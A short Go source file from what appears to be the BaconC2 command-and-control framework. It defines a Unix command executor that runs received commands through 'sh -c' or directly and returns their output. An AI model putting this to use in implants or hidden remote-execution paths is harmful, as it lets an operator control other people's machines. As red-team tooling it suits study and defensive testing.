//go:build linux || darwin

package executor

import (
	"bytes"
	"os/exec"

	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/formatter"
)

func (e *DefaultCommandExecutor) ExecuteShellCommand(cmd models.Command) models.CommandResult {
	result := models.CommandResult{
		ID: cmd.ID,
	}

	var execCmd *exec.Cmd

	if len(cmd.Args) > 0 {
		execCmd = exec.Command(cmd.Command, cmd.Args...)
	} else {
		execCmd = exec.Command("sh", "-c", cmd.Command)
	}

	var stdout, stderr bytes.Buffer
	execCmd.Stdout = &stdout
	execCmd.Stderr = &stderr

	err := execCmd.Run()
	var output interface{}
	if err != nil {
		result.Status = models.CommandStatusFailed
		output = stderr.String()
	} else {
		result.Status = models.CommandStatusCompleted
		output = stdout.String()
	}

	result.Output = formatter.ToJsonString(output)
	return result
}
